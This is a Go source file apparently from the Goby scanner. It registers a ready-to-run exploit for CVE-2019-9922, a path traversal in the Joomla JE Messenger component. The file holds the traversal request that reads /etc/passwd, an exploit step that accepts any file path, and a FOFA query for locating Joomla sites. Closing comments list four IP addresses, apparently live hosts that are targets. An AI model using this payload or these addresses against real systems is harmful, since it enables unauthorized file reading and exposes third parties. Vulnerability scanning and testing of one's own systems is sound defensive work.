package exploits

import (
    "git.gobies.org/goby/goscanner/goutils"
)

func init() {
    expJson := `{
    "Name": "Joomla JE Messenger Arbitrary File Read (CVE-2019-9922)",
    "Description": "<p>Joomla! is an open source, cross-platform content management system (CMS) developed by the American Open Source Matters team using PHP and MySQL. Harmis JE Messenger component is a personal message management component used in it, which supports receiving, sending emails and online messages.</p><p>A path traversal vulnerability exists in version 1.2.2 of the Joomla! Harmis JE Messenger component, which arises from a network system or product failing to properly filter special elements in resource or file paths. An attacker could exploit this vulnerability to access locations outside the restricted directory.</p>",
    "Product": "Joomla JE Messenger",
    "Homepage": "https://extensions.joomla.org/extension/je-messenger/",
    "DisclosureDate": "2022-07-09",
    "Author": "abszse",
    "FofaQuery": "body=\"Open Source Content Management\" && body=\"Joomla\"",
    "GobyQuery": "body=\"Open Source Content Management\" && body=\"Joomla\"",
    "Level": "2",
    "Impact": "<p>A path traversal vulnerability exists in version 1.2.2 of the Joomla! Harmis JE Messenger component, which arises from a network system or product failing to properly filter special elements in resource or file paths. An attacker could exploit this vulnerability to access locations outside the restricted directory.</p>",
    "Recommendation": "<p>At present, the manufacturer has released fixes to solve this security problem, please pay attention to the official website update in time: <a href=\"https://extensions.joomla.org/extension/je-messenger/\">https://extensions.joomla.org/extension/je-messenger/</a></p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "../../.././../../../etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/index.php/component/jemessenger/box_details?task=download&dw_file=../../.././../../../etc/passwd",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "root:(.*?):0:0",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/index.php/component/jemessenger/box_details?task=download&dw_file={{{cmd}}}",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2019-9922"
    ],
    "CNNVD": [
        "CNNVD-201903-1187"
    ],
    "CNVD": [],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Joomla JE Messenger 任意文件读取漏洞 (CVE-2019-9922)",
            "Product": "Joomla JE Messenger",
            "Description": "<p>Joomla!是美国Open Source Matters团队的一套使用PHP和MySQL开发的开源、跨平台的内容管理系统(CMS)。Harmis JE Messenger component是使用在其中的一款个人消息管理组件，它支持收、发邮件和在线消息。<br></p><p>Joomla! Harmis JE Messenger组件1.2.2版本中存在路径遍历漏洞，该漏洞源于网络系统或产品未能正确地过滤资源或文件路径中的特殊元素。攻击者可利用该漏洞访问受限目录之外的位置。<br></p>",
            "Recommendation": "<p>目前厂商已发布修复措施解决此安全问题，请及时关注官网更新：<a href=\"https://extensions.joomla.org/extension/je-messenger/\">https://extensions.joomla.org/extension/je-messenger/</a><br></p>",
            "Impact": "<p>Joomla! Harmis JE Messenger组件1.2.2版本中存在路径遍历漏洞，该漏洞源于网络系统或产品未能正确地过滤资源或文件路径中的特殊元素。攻击者可利用该漏洞访问受限目录之外的位置。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Joomla JE Messenger Arbitrary File Read (CVE-2019-9922)",
            "Product": "Joomla JE Messenger",
            "Description": "<p>Joomla! is an open source, cross-platform content management system (CMS) developed by the American Open Source Matters team using PHP and MySQL. Harmis JE Messenger component is a personal message management component used in it, which supports receiving, sending emails and online messages.<br></p><p>A path traversal vulnerability exists in version 1.2.2 of the Joomla! Harmis JE Messenger component, which arises from a network system or product failing to properly filter special elements in resource or file paths. An attacker could exploit this vulnerability to access locations outside the restricted directory.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released fixes to solve this security problem, please pay attention to the official website update in time: <a href=\"https://extensions.joomla.org/extension/je-messenger/\">https://extensions.joomla.org/extension/je-messenger/</a><br></p>",
            "Impact": "<p>A path traversal vulnerability exists in version 1.2.2 of the Joomla! Harmis JE Messenger component, which arises from a network system or product failing to properly filter special elements in resource or file paths. An attacker could exploit this vulnerability to access locations outside the restricted directory.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

    ExpManager.AddExploit(NewExploit(
        goutils.GetFileName(),
        expJson,
        nil,
        nil,
    ))
}
//http://193.49.54.113:10000
//http://193.49.48.26
//http://193.49.54.93:10000
//http://193.49.54.64:10000